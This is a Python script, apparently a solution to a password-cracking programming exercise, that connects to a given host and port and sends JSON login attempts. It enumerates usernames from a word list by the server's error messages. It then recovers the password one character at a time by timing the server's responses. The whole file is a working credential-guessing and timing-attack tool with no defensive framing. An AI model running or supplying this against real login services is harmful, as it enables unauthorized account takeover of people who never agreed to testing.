import socket
import itertools
import argparse
import json
import string
from datetime import datetime


def logins() -> str:
	with open('logins.txt', 'r') as file:
		for line in file.readlines():
			yield line.strip('\n')


def possible_upper_and_lower() -> str:
	with open('passwords.txt', 'r') as file:
		for line in file.readlines():
			word = line.strip('\n')
			for x in itertools.product(*([letter.lower(), letter.upper()] for letter in word)):
				yield ''.join(x)


def password_generator(alphabet=string.ascii_letters + ''.join([str(digit) for digit in range(10)]), length=1) -> str:
	for i in range(1, length + 1):
		for product in itertools.product(alphabet, repeat=i):
			yield ''.join(product)


def login_password_to_json_str(log: str, p: str = ' ') -> str:
	return json.dumps({'login': log, 'password': p})


def json_str_to_py_object(json_str: str) -> dict:
	return json.loads(json_str)


if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('host', help='enter hostname')
	parser.add_argument('port', help='enter port number', type=int)
	args = parser.parse_args()

	# Create a new socket.
	with socket.socket() as client_socket:
		client_socket.connect((args.host, args.port))

		# find login
		for login in logins():
			client_socket.send(login_password_to_json_str(login).encode())
			response: str = json_str_to_py_object(client_socket.recv(1024).decode())['result']
			if response == 'Wrong login!':
				continue
			elif response == 'Wrong password!':
				login = login
				break
			else:
				print(response)
				break

		# get first password character
		password_beginning: str = ''
		while True:
			for first_letter in password_generator(length=1):
				password = password_beginning + first_letter
				client_socket.send(login_password_to_json_str(login, password).encode())
				start = datetime.now()
				response: str = json_str_to_py_object(client_socket.recv(1024).decode())['result']
				finish = datetime.now()
				if response == 'Wrong password!':
					if (finish - start).microseconds >= 90000:
						password_beginning += first_letter
						break
					else:
						continue
				elif response == 'Connection success!':
					print(login_password_to_json_str(login, password))
					exit()
				else:
					print(response)
					break
